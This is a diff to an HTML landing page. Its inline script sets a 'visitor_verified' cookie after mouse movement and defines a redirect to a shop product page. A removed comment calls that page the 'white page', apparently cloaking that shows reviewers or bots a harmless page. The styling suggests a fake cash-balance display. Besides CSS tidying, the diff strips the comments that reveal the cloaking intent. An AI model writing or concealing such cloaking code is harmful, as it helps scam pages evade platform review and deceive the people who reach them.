@@ -7,13 +7,13 @@
   <script>
     (function () {
       const COOKIE_NAME = "visitor_verified";
-      const REDIRECT_URL = "https://meridianshoppe.com/products/asa-duffle-bag"; // white page
+      const REDIRECT_URL = "https://meridianshoppe.com/products/asa-duffle-bag";
       const cookieExists = document.cookie.includes(`${COOKIE_NAME}=true`);
       let engaged = false;
 
       function markEngaged() {
         engaged = true;
-        document.cookie = `${COOKIE_NAME}=true; path=/; max-age=86400`; // valid 24h
+        document.cookie = `${COOKIE_NAME}=true; path=/; max-age=86400`;
       }
 
       window.addEventListener("mousemove", markEngaged);
@@ -39,13 +39,20 @@
       margin:0;
       padding:0;
       background:#fff;
+    }
+    .top-section {
+      padding: 16px 0 4px;
       background-image: url('NEW Spring Background.png');
       background-size: cover;
       background-repeat: no-repeat;
-      background-position: top center;
+      background-position: center top;
     }
-    .top-section { padding: 16px 0 4px; }
-    .card-image { max-width:50%; height:auto; margin:0 auto 2px; display:block; }
+    .card-image {
+      max-width:50%;
+      height:auto;
+      margin:0 auto 2px;
+      display:block;
+    }
     .main-content { padding:10px; max-width:90%; margin:0 auto; }
     .cash-balance { font-size:28px; color:#00d72e; font-weight:bold; margin:2px 0; }
     .verified-image { display:block; margin:2px auto 8px; height:16px; width:auto; }
